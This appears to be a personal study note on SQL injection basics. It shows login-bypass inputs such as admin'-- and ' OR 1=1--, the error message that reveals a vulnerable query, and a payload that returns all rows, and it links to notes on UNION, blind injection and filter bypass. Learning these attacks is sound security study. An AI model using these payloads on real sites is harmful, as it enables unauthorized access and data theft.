### Title
Tags: #sqli
Related to: 
See also: [[SQLi - advance exploits <Blind-sqli>]]
Previous:

### Body
questions: [[2024-06-05]]
**Summary**: Here i wrote about the basics of sqli and basic over view of everything.

**Notes:**
### injection

`SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’`
this query happens in a login
to by pass this use this
```
SELECT * FROM users WHERE username = ‘admin’--’ AND password = ‘foo’
=> SELECT * FROM users WHERE username = ‘admin’ 
```

=="--" this means comment in sql ==


Suppose that the attacker does not know the administrator’s username. In
most applications, the first account in the database is an administrative user,
because this account normally is created manually and then is used to generate

all other accounts via the application. Furthermore, if the query returns the
details for more than one user, most applications will simply process the first
user whose details are returned. An attacker can often exploit this behavior to
log in as the first user in the database by supplying the username:
```
‘ OR 1=1--
```

This causes the application to perform the query:
```
SELECT * FROM users WHERE username = ‘’ OR 1=1--’ AND password = ‘foo’
```
Because of the comment symbol, this is equivalent to:
```
SELECT * FROM users WHERE username = ‘’ OR 1=1
```

## basic sqli

```
SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and
published=1
```

to find all the book published by wiley

```
SELECT author,title,year FROM books WHERE publisher = ‘O’Reilly’ and
published=1
```
this will come with a error if the website is vulnerable to the #sqli.

error should look like this:
```
Incorrect syntax near ‘Reilly’.
Server: Msg 105, Level 15, State 1, Line 1
Unclosed quotation mark before the character string ‘
```

the following payload would work on this
```
Wiley’ OR 1=1--
```

This causes the application to perform the following query:
```
SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR
1=1--’ and published=1
```

[[SQL injection - Testing basic vuln|Test for SQLi vulnerbility]]

You can inject using these sql commands.
- Insert
- Update
- Select
- Union

### The Union operator
The union operator adds to table if they have similiar columns and content. [[Sql - Union clause|HERE]] is a reference for the basic of union and [[Union based sqli|HERE]] is more about union based sqli.

also learn [[SQL injection - Extracting data|how to extract]] data from a vulnerable website

### Bypass the filter
sometimes there are filter that will sanitize certein keywords. We can still bypass these filters. [[Bypass filters|HERE]] is some basic techniques to bypass them.


### Blind SQL
sometimes there is no issue seen on the target using sqli but it is still vulnerable. Here we have to techniques to get them. This is the [[SQLi - advance exploits <Blind-sqli> |Link.]]

### References
- [[SQL injection - Extracting data]]
- [[SQL injection - Testing basic vuln]]
- [[Sql - Union clause]]
- [[Need to read this - sqli]]
- [[watch this - sqli-union-based]]



